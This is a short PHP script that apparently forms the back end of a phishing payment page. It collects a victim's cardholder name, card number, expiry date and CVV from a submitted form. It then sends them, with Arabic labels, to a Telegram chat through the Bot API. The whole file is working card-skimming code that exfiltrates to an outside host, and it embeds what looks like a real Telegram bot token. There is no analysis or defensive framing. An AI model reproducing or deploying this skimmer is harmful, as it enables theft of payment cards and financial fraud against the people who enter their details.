<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $cardHolder = $_POST["cardHolder"];
    $cardNumber = $_POST["cardNumber"];
    $expiryMonth = $_POST["expiryMonth"];
    $expiryYear = $_POST["expiryYear"];
    $cvv = $_POST["cvv"];

    // Replace YOUR_BOT_TOKEN with your actual bot token
    $botToken = "6769936181:AAHsmSNhnRNhMFdueT6efhrNiFX7f9W41Os";
    // Replace YOUR_CHAT_ID with your actual chat ID
    $chatID = "@Magdddbot";

    // Compose the message to be sent
    $message = "اسم حامل البطاقة: " . $cardHolder . "\n";
    $message .= "رقم البطاقة: " . $cardNumber . "\n";
    $message .= "انتهاء الصلاحية: " . $expiryMonth . "/" . $expiryYear . "\n";
    $message .= "رمز البطاقة CVV: " . $cvv;

    // Send the message to Telegram using cURL
    $url = "https://api.telegram.org/bot" . $botToken . "/sendMessage";
    $data = array(
        "chat_id" => $chatID,
        "text" => $message
    );

    $options = array(
        "http" => array(
            "header" => "Content-type: application/x-www-form-urlencoded\r\n",
            "method" => "POST",
            "content" => http_build_query($data)
        )
    );

    $context = stream_context_create($options);
    $result = file_get_contents($url, false, $context);

    if ($result === false) {
        echo "حدث خطأ أثناء إرسال البيانات إلى بوت التلجرام.";
    } else {
        echo "تم إرسال البيانات بنجاح إلى بوت التلجرام.";
    }
}
?>